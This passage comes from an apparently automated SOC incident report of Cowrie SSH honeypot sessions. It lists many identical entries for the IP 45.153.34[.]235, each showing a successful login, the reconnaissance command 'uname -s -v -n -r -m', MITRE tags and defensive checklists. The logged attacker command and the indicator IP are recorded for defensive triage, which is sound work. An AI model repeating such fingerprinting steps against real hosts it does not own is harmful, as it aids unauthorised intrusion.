- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a465bac8befc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:20` | `cowrie.session.connect` |
| `2026-07-04 15:07:20` | `cowrie.client.version` |
| `2026-07-04 15:07:20` | `cowrie.client.kex` |
| `2026-07-04 15:07:20` | `cowrie.login.success` |
| `2026-07-04 15:07:21` | `cowrie.session.params` |
| `2026-07-04 15:07:21` | `cowrie.command.input` |
| `2026-07-04 15:07:21` | `cowrie.log.closed` |
| `2026-07-04 15:07:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6a3e0381591

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:23` | `cowrie.session.connect` |
| `2026-07-04 15:07:23` | `cowrie.client.version` |
| `2026-07-04 15:07:23` | `cowrie.client.kex` |
| `2026-07-04 15:07:23` | `cowrie.login.success` |
| `2026-07-04 15:07:24` | `cowrie.session.params` |
| `2026-07-04 15:07:24` | `cowrie.command.input` |
| `2026-07-04 15:07:24` | `cowrie.log.closed` |
| `2026-07-04 15:07:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8247252dd611

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:26` | `cowrie.session.connect` |
| `2026-07-04 15:07:26` | `cowrie.client.version` |
| `2026-07-04 15:07:27` | `cowrie.client.kex` |
| `2026-07-04 15:07:27` | `cowrie.login.success` |
| `2026-07-04 15:07:28` | `cowrie.session.params` |
| `2026-07-04 15:07:28` | `cowrie.command.input` |
| `2026-07-04 15:07:28` | `cowrie.log.closed` |
| `2026-07-04 15:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eff9ceee7aa4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:30` | `cowrie.session.connect` |
| `2026-07-04 15:07:30` | `cowrie.client.version` |
| `2026-07-04 15:07:30` | `cowrie.client.kex` |
| `2026-07-04 15:07:30` | `cowrie.login.success` |
| `2026-07-04 15:07:31` | `cowrie.session.params` |
| `2026-07-04 15:07:31` | `cowrie.command.input` |
| `2026-07-04 15:07:31` | `cowrie.log.closed` |
| `2026-07-04 15:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3691504978f0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:33` | `cowrie.session.connect` |
| `2026-07-04 15:07:33` | `cowrie.client.version` |
| `2026-07-04 15:07:33` | `cowrie.client.kex` |
| `2026-07-04 15:07:34` | `cowrie.login.success` |
| `2026-07-04 15:07:34` | `cowrie.session.params` |
| `2026-07-04 15:07:34` | `cowrie.command.input` |
| `2026-07-04 15:07:35` | `cowrie.log.closed` |
| `2026-07-04 15:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4355235250c7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:37` | `cowrie.session.connect` |
| `2026-07-04 15:07:37` | `cowrie.client.version` |
| `2026-07-04 15:07:37` | `cowrie.client.kex` |
| `2026-07-04 15:07:37` | `cowrie.login.success` |
| `2026-07-04 15:07:38` | `cowrie.session.params` |
| `2026-07-04 15:07:38` | `cowrie.command.input` |
| `2026-07-04 15:07:38` | `cowrie.log.closed` |
| `2026-07-04 15:07:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4138aaac3819

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:40` | `cowrie.session.connect` |
| `2026-07-04 15:07:40` | `cowrie.client.version` |
| `2026-07-04 15:07:40` | `cowrie.client.kex` |
| `2026-07-04 15:07:41` | `cowrie.login.success` |
| `2026-07-04 15:07:41` | `cowrie.session.params` |
| `2026-07-04 15:07:41` | `cowrie.command.input` |
| `2026-07-04 15:07:41` | `cowrie.log.closed` |
| `2026-07-04 15:07:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0736e0a6fc6d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:43` | `cowrie.session.connect` |
| `2026-07-04 15:07:43` | `cowrie.client.version` |
| `2026-07-04 15:07:44` | `cowrie.client.kex` |
| `2026-07-04 15:07:44` | `cowrie.login.success` |
| `2026-07-04 15:07:45` | `cowrie.session.params` |
| `2026-07-04 15:07:45` | `cowrie.command.input` |
| `2026-07-04 15:07:45` | `cowrie.log.closed` |
| `2026-07-04 15:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1c7f9cd7e7b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:47` | `cowrie.session.connect` |
| `2026-07-04 15:07:47` | `cowrie.client.version` |
| `2026-07-04 15:07:47` | `cowrie.client.kex` |
| `2026-07-04 15:07:47` | `cowrie.login.success` |
| `2026-07-04 15:07:48` | `cowrie.session.params` |
| `2026-07-04 15:07:48` | `cowrie.command.input` |
| `2026-07-04 15:07:48` | `cowrie.log.closed` |
| `2026-07-04 15:07:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e294c0e03c19

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:50` | `cowrie.session.connect` |
| `2026-07-04 15:07:50` | `cowrie.client.version` |
| `2026-07-04 15:07:50` | `cowrie.client.kex` |
| `2026-07-04 15:07:51` | `cowrie.login.success` |
| `2026-07-04 15:07:51` | `cowrie.session.params` |
| `2026-07-04 15:07:51` | `cowrie.command.input` |
| `2026-07-04 15:07:51` | `cowrie.log.closed` |
| `2026-07-04 15:07:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6332eeaeb4cd

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:53` | `cowrie.session.connect` |
| `2026-07-04 15:07:54` | `cowrie.client.version` |
| `2026-07-04 15:07:54` | `cowrie.client.kex` |
| `2026-07-04 15:07:54` | `cowrie.login.success` |
| `2026-07-04 15:07:55` | `cowrie.session.params` |
| `2026-07-04 15:07:55` | `cowrie.command.input` |
| `2026-07-04 15:07:55` | `cowrie.log.closed` |
| `2026-07-04 15:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1a3dfb19fde

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:07 |
| **Last Seen** | 2026-07-04 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:07:57` | `cowrie.session.connect` |
| `2026-07-04 15:07:57` | `cowrie.client.version` |
| `2026-07-04 15:07:57` | `cowrie.client.kex` |
| `2026-07-04 15:07:57` | `cowrie.login.success` |
| `2026-07-04 15:07:58` | `cowrie.session.params` |
| `2026-07-04 15:07:58` | `cowrie.command.input` |
| `2026-07-04 15:07:58` | `cowrie.log.closed` |
| `2026-07-04 15:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ace2b4886e

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:00` | `cowrie.session.connect` |
| `2026-07-04 15:08:00` | `cowrie.client.version` |
| `2026-07-04 15:08:00` | `cowrie.client.kex` |
| `2026-07-04 15:08:01` | `cowrie.login.success` |
| `2026-07-04 15:08:01` | `cowrie.session.params` |
| `2026-07-04 15:08:01` | `cowrie.command.input` |
| `2026-07-04 15:08:02` | `cowrie.log.closed` |
| `2026-07-04 15:08:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2618d3ba66

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:04` | `cowrie.session.connect` |
| `2026-07-04 15:08:04` | `cowrie.client.version` |
| `2026-07-04 15:08:04` | `cowrie.client.kex` |
| `2026-07-04 15:08:04` | `cowrie.login.success` |
| `2026-07-04 15:08:05` | `cowrie.session.params` |
| `2026-07-04 15:08:05` | `cowrie.command.input` |
| `2026-07-04 15:08:05` | `cowrie.log.closed` |
| `2026-07-04 15:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b86a056852e1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:07` | `cowrie.session.connect` |
| `2026-07-04 15:08:07` | `cowrie.client.version` |
| `2026-07-04 15:08:07` | `cowrie.client.kex` |
| `2026-07-04 15:08:07` | `cowrie.login.success` |
| `2026-07-04 15:08:08` | `cowrie.session.params` |
| `2026-07-04 15:08:08` | `cowrie.command.input` |
| `2026-07-04 15:08:08` | `cowrie.log.closed` |
| `2026-07-04 15:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cb886a1cd6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:10` | `cowrie.session.connect` |
| `2026-07-04 15:08:10` | `cowrie.client.version` |
| `2026-07-04 15:08:11` | `cowrie.client.kex` |
| `2026-07-04 15:08:11` | `cowrie.login.success` |
| `2026-07-04 15:08:12` | `cowrie.session.params` |
| `2026-07-04 15:08:12` | `cowrie.command.input` |
| `2026-07-04 15:08:12` | `cowrie.log.closed` |
| `2026-07-04 15:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2d3d2545387

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:14` | `cowrie.session.connect` |
| `2026-07-04 15:08:14` | `cowrie.client.version` |
| `2026-07-04 15:08:14` | `cowrie.client.kex` |
| `2026-07-04 15:08:14` | `cowrie.login.success` |
| `2026-07-04 15:08:15` | `cowrie.session.params` |
| `2026-07-04 15:08:15` | `cowrie.command.input` |
| `2026-07-04 15:08:15` | `cowrie.log.closed` |
| `2026-07-04 15:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f192ee8d792f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:17` | `cowrie.session.connect` |
| `2026-07-04 15:08:17` | `cowrie.client.version` |
| `2026-07-04 15:08:17` | `cowrie.client.kex` |
| `2026-07-04 15:08:17` | `cowrie.login.success` |
| `2026-07-04 15:08:18` | `cowrie.session.params` |
| `2026-07-04 15:08:18` | `cowrie.command.input` |
| `2026-07-04 15:08:18` | `cowrie.log.closed` |
| `2026-07-04 15:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-099019a4fb36

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:20` | `cowrie.session.connect` |
| `2026-07-04 15:08:20` | `cowrie.client.version` |
| `2026-07-04 15:08:20` | `cowrie.client.kex` |
| `2026-07-04 15:08:21` | `cowrie.login.success` |
| `2026-07-04 15:08:22` | `cowrie.session.params` |
| `2026-07-04 15:08:22` | `cowrie.command.input` |
| `2026-07-04 15:08:22` | `cowrie.log.closed` |
| `2026-07-04 15:08:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-342ce7ee3990

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:24` | `cowrie.session.connect` |
| `2026-07-04 15:08:24` | `cowrie.client.version` |
| `2026-07-04 15:08:24` | `cowrie.client.kex` |
| `2026-07-04 15:08:24` | `cowrie.login.success` |
| `2026-07-04 15:08:25` | `cowrie.session.params` |
| `2026-07-04 15:08:25` | `cowrie.command.input` |
| `2026-07-04 15:08:25` | `cowrie.log.closed` |
| `2026-07-04 15:08:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80645d69b5e3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:27` | `cowrie.session.connect` |
| `2026-07-04 15:08:27` | `cowrie.client.version` |
| `2026-07-04 15:08:27` | `cowrie.client.kex` |
| `2026-07-04 15:08:27` | `cowrie.login.success` |
| `2026-07-04 15:08:28` | `cowrie.session.params` |
| `2026-07-04 15:08:28` | `cowrie.command.input` |
| `2026-07-04 15:08:28` | `cowrie.log.closed` |
| `2026-07-04 15:08:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7d2c71e884b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:30` | `cowrie.session.connect` |
| `2026-07-04 15:08:30` | `cowrie.client.version` |
| `2026-07-04 15:08:30` | `cowrie.client.kex` |
| `2026-07-04 15:08:30` | `cowrie.login.success` |
| `2026-07-04 15:08:31` | `cowrie.session.params` |
| `2026-07-04 15:08:31` | `cowrie.command.input` |
| `2026-07-04 15:08:31` | `cowrie.log.closed` |
| `2026-07-04 15:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a54faf69d343

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:33` | `cowrie.session.connect` |
| `2026-07-04 15:08:33` | `cowrie.client.version` |
| `2026-07-04 15:08:34` | `cowrie.client.kex` |
| `2026-07-04 15:08:34` | `cowrie.login.success` |
| `2026-07-04 15:08:34` | `cowrie.session.params` |
| `2026-07-04 15:08:34` | `cowrie.command.input` |
| `2026-07-04 15:08:35` | `cowrie.log.closed` |
| `2026-07-04 15:08:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-299ea85c44b4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:37` | `cowrie.session.connect` |
| `2026-07-04 15:08:37` | `cowrie.client.version` |
| `2026-07-04 15:08:37` | `cowrie.client.kex` |
| `2026-07-04 15:08:37` | `cowrie.login.success` |
| `2026-07-04 15:08:38` | `cowrie.session.params` |
| `2026-07-04 15:08:38` | `cowrie.command.input` |
| `2026-07-04 15:08:38` | `cowrie.log.closed` |
| `2026-07-04 15:08:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a515b0537d61

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:40` | `cowrie.session.connect` |
| `2026-07-04 15:08:40` | `cowrie.client.version` |
| `2026-07-04 15:08:40` | `cowrie.client.kex` |
| `2026-07-04 15:08:40` | `cowrie.login.success` |
| `2026-07-04 15:08:41` | `cowrie.session.params` |
| `2026-07-04 15:08:41` | `cowrie.command.input` |
| `2026-07-04 15:08:41` | `cowrie.log.closed` |
| `2026-07-04 15:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9d0dcce38b0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:43` | `cowrie.session.connect` |
| `2026-07-04 15:08:43` | `cowrie.client.version` |
